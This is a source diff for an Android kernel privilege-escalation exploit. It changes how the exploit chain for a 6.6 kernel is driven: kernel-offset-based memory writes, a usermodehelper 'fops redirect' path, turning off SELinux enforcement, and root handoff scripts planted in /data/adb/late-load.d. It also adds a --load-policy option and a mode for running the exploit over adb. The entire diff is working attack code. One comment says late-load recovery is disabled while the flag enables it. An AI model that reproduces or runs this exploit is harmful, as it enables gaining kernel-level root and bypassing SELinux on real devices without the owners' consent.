@@ -18,6 +18,7 @@
 
 const struct kernel_offsets *active_offsets = NULL;
 int force_umh_mode;
+static int load_policy_mode;
 
 /* Override target.h _OFF macros with dynamic offsets from offsets.h table */
 #undef SELINUX_ENFORCING_OFF
@@ -364,6 +365,11 @@ static int run_w1_attempt(int attempt) {
 #define LATELOAD_RECOVERY_PATH LATELOAD_DIR "/99-anchor-recover.sh"
 #define BOOTSTRAP_LOCK_ENV "ANCHOR_BOOTSTRAP_LOCK_DIR"
 
+/* Anchor-specific one-shot late-load recovery is temporarily disabled while
+ * isolating the OP13 reboot path.  Keep the implementation below intact so it
+ * can be re-enabled without reconstructing the handoff logic. */
+#define ANCHOR_ENABLE_LATELOAD_RECOVERY 1
+
 static char bootstrap_lock_dir[512];
 static char bootstrap_lock_owner[512];
 
@@ -571,6 +577,7 @@ static int publish_root_script(const char *path, const char *script) {
  * in /data/adb/late-load.d synchronously after it has loaded KernelSU and its
  * sepolicy rules, but before it applies the dynamic-manager configuration.
  * Install a one-shot handoff there while the W2 child is root. */
+#if ANCHOR_ENABLE_LATELOAD_RECOVERY
 static int write_lateload_recovery_script(void) {
   const char *dir = LATELOAD_DIR;
   const char *path = LATELOAD_RECOVERY_PATH;
@@ -622,6 +629,7 @@ static int write_lateload_recovery_script(void) {
   }
   return 1;
 }
+#endif
 
 static int write_root_script_at(const char *script_path) {
   if (strcmp(script_path, ROOT_SCRIPT_PATH) == 0)
@@ -837,10 +845,15 @@ static void child_main(struct child_pipes *p) {
     write_bridge_state("root-script-unavailable");
     _exit(1);
   }
+#if ANCHOR_ENABLE_LATELOAD_RECOVERY
   if (!write_lateload_recovery_script()) {
     write_bridge_state("late-load-script-unavailable");
     _exit(1);
   }
+#else
+  /* Do not leave a Recovery script from an earlier build armed. */
+  unlink(LATELOAD_RECOVERY_PATH);
+#endif
   pid_t gc = fork();
   if (gc == 0) {
     int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
@@ -908,17 +921,17 @@ int run_exploit(int argc, char **argv) {
       active_offsets->off_call_usermodehelper_exec_work &&
       active_offsets->off_ashmem_misc_fops;
   pr_info("UMH policy: available=%d force=%d\n", umh_available, force_umh_mode);
-  if (active_offsets && active_offsets->requires_umh && !umh_available) {
-    pr_error("this OP13 6.6 kernel requires exact UMH offsets; refusing W1/W2 fallback\n");
-    pr_error("re-extract off_system_unbound_wq and off_call_usermodehelper_exec_work for %s\n",
-             active_offsets->uname_r);
-    return 1;
-  }
-  if (umh_available && !write_umh_root_script()) {
-    pr_error("UMH root handoff script unavailable\n");
-    return 1;
-  }
-  if (force_umh_mode && umh_available) {
+  if (force_umh_mode) {
+    if (!umh_available) {
+      pr_error("forced UMH requested but exact UMH offsets are unavailable\n");
+      cleanup_tmp_compat_files();
+      return 1;
+    }
+    if (!write_umh_root_script()) {
+      pr_error("UMH root handoff script unavailable\n");
+      cleanup_tmp_compat_files();
+      return 1;
+    }
     pr_info("UMH path: fops redirect (mode=4)...\n");
     slab_drain();
     TIMER("pre-UMH drain");
@@ -926,12 +939,12 @@ int run_exploit(int argc, char **argv) {
     TIMER("fops redirect done");
     selinux_ok = check_selinux_off();
   }
-  if (force_umh_mode && umh_available && !root_child_done) {
+  if (force_umh_mode && !root_child_done) {
     pr_error("forced UMH failed; refusing W1/W2 fallback\n");
     cleanup_tmp_compat_files();
     return 1;
   }
-  if (!selinux_ok && !root_child_done) {
+  if (!force_umh_mode && !selinux_ok) {
     /* Match upstream behavior: drain once before the five W1 attempts, not
      * once inside every retry. */
     slab_drain();
@@ -944,7 +957,7 @@ int run_exploit(int argc, char **argv) {
     }
     if (!selinux_ok) { pr_error("Write 1 failed\n"); return 1; }
     TIMER("Write 1 complete");
-  } else if (!selinux_ok && root_child_done) {
+  } else if (root_child_done) {
     selinux_ok = 1;
   } else {
     pr_success("SELinux already off\n");
@@ -957,8 +970,12 @@ int run_exploit(int argc, char **argv) {
     pr_info("waiting for su...\n");
     for (int i = 0; i < 60; i++) {
       if (system("su -c 'id' > /dev/null 2>&1") == 0) {
-        pr_success("su ready, fixing SELinux policy\n");
-        system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
+        pr_success("su ready\n");
+        if (load_policy_mode) {
+          system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
+        } else {
+          pr_info("load_policy disabled by user option\n");
+        }
         su_ready = 1;
         break;
       }
@@ -1038,13 +1055,17 @@ int run_exploit(int argc, char **argv) {
   pr_info("waiting for su...\n");
   for (int i = 0; i < 60; i++) {
     if (system("su -c 'id' > /dev/null 2>&1") == 0) {
-      pr_success("su ready, fixing SELinux policy\n");
-      int policy_rc = system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
-      if (policy_rc == 0)
-        pr_success("immediate load_policy done\n");
-      else
-        pr_error("immediate load_policy failed rc=%d; late-load recovery remains armed\n",
-                 policy_rc);
+      pr_success("su ready\n");
+      if (load_policy_mode) {
+        int policy_rc = system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
+        if (policy_rc == 0)
+          pr_success("immediate load_policy done\n");
+        else
+          pr_error("immediate load_policy failed rc=%d; late-load recovery remains armed\n",
+                   policy_rc);
+      } else {
+        pr_info("load_policy disabled by user option\n");
+      }
       su_ready = 1;
       break;
     }
@@ -1112,6 +1133,7 @@ tcp_ready:
    * environment. It can execute a known /data/app path but cannot enumerate
   * that directory, so derive the packaged library path from `pm path`. */
   const char *force_arg = env_flag("ANCHOR_FORCE_UMH", 0) ? " --force-umh" : "";
+  const char *load_policy_arg = env_flag("ANCHOR_LOAD_POLICY", 0) ? " --load-policy" : "";
   char remote_cmd[2048];
   snprintf(remote_cmd, sizeof(remote_cmd),
     "rm -f /data/local/tmp/.ghostlock_root.sh /data/local/tmp/.ghostlock_w1 "
@@ -1120,10 +1142,10 @@ tcp_ready:
     "APK=$(pm path " ANCHOR_BOOTSTRAP_PACKAGE " 2>/dev/null | sed -n 's/^package://p' | head -n 1); "
     "if [ -z \"$APK\" ]; then RC=127; STAGE=apk-not-found; "
     "else APPBIN=${APK%%/base.apk}/lib/arm64/libanchor.so; "
-    "if [ -x \"$APPBIN\" ]; then \"$APPBIN\"%s; RC=$?; STAGE=anchor-exited; "
+    "if [ -x \"$APPBIN\" ]; then \"$APPBIN\"%s%s; RC=$?; STAGE=anchor-exited; "
     "else RC=126; STAGE=appbin-not-executable; fi; fi; "
     "printf '\\n__ANCHOR_STAGE=%%s\\n__ANCHOR_RC=%%s\\n' \"$STAGE\" \"$RC\"; exit \"$RC\"",
-    force_arg);
+    force_arg, load_policy_arg);
   int adb_ret = mini_adb_shell(remote_cmd);
   pr_info("mini-adb returned %d\n", adb_ret);
   result = adb_ret;
@@ -1164,11 +1186,19 @@ static int run_write1_only(void) {
 
 int main(int argc, char **argv) {
     handle_umh_mode(argc, argv);
-    if (argc > 1 && strcmp(argv[1], "--force-umh") == 0)
-        force_umh_mode = 1;
-    if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0)
+    force_umh_mode = env_flag("ANCHOR_FORCE_UMH", 0);
+    load_policy_mode = env_flag("ANCHOR_LOAD_POLICY", 0);
+    int bootstrap = 0;
+    int write1 = 0;
+    for (int i = 1; i < argc; i++) {
+      if (strcmp(argv[i], "--force-umh") == 0) force_umh_mode = 1;
+      else if (strcmp(argv[i], "--load-policy") == 0) load_policy_mode = 1;
+      else if (strcmp(argv[i], "--bootstrap") == 0) bootstrap = 1;
+      else if (strcmp(argv[i], "--write1") == 0) write1 = 1;
+    }
+    if (bootstrap)
         return run_bootstrap();
-    if (argc > 1 && strcmp(argv[1], "--write1") == 0)
+    if (write1)
         return run_write1_only();
     return run_exploit(argc, argv);
 }
